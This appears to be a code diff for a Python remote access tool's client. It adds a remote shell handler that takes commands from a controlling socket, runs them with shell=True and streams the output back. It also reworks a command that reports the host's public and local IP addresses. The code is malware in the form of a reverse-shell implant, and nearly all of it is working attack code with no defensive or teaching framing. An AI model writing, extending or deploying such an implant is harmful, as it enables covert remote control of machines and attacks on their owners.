@@ -5,6 +5,8 @@ import urllib.request
 import json
 import uuid
 import struct
+import subprocess
+import os
 
 
 IP = "127.0.0.1"
@@ -35,36 +37,71 @@ def recvall(sock, n):
     return packet  
 
 
-def get_ip_info():
+def get_ip_info(sock):
         try:
             lip = str(socket.gethostbyname(socket.gethostname()))
             res = urllib.request.urlopen('https://api.ipify.org?format=json', timeout=3)
             data = json.loads(res.read().decode())
             pip = data.get('ip', 'Unknown')
-            output = {
+            ips = {
                 "pip": pip,
                 "lip": lip
             }
-            return json.dumps(output).encode()
+            output = json.dumps(ips).encode()
+            send(sock, output)
         except Exception as e:
-            return f"Error getting IP info: {e}".encode()
+            print(f"Error IP info: {e}") 
     
 def kill_connection(sock):
         sock.close()
         sys.exit()
 
+def handle_shell(sock):
+    curr_dir = os.getcwd() # not necessary
+
+    while True:
+        cmd = recv(sock).decode()
+        if cmd == "exit_shell":
+            break
+        try:
+            if cmd.startswith("cd "):
+                dir = cmd[3:]
+                if not os.path.isdir(dir):
+                    send(sock, f"$ No such directory {dir}\n".encode())
+                    send(sock, b"END_OF_OUTPUT")
+                    continue
+                os.chdir(dir)
+                send(sock, f"$ {str(os.getcwd())}\n".encode())
+                send(sock, b"END_OF_OUTPUT")
+                continue
+            else:
+                proc = subprocess.Popen(
+                    cmd,
+                    shell=True,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    stdin=subprocess.PIPE
+                )
+                for line in proc.stdout:
+                    send(sock, line)
+                send(sock, b"END_OF_OUTPUT")      
+        except Exception as e:
+            send(sock, f"Error: {str(e)}".encode())
+            send(sock, b"END_OF_OUTPUT")
+
 def handle_cmd(sock):
     try:
         while True:
+            cmd = recv(sock).decode()
+            if not cmd or cmd == None:
+                continue
             try:
-                cmd = recv(sock).decode()
-                if not cmd or cmd == None:
-                    print("Invalid cmd")
-                    
                 if cmd == "getip":
-                    output = get_ip_info()
-                    send(sock, output)
-
+                    get_ip_info(sock)
+                
+                elif cmd == "shell":
+                    handle_shell(sock)
+                    
                 elif cmd.lower() == "kill":
                     kill_connection(sock)
                     
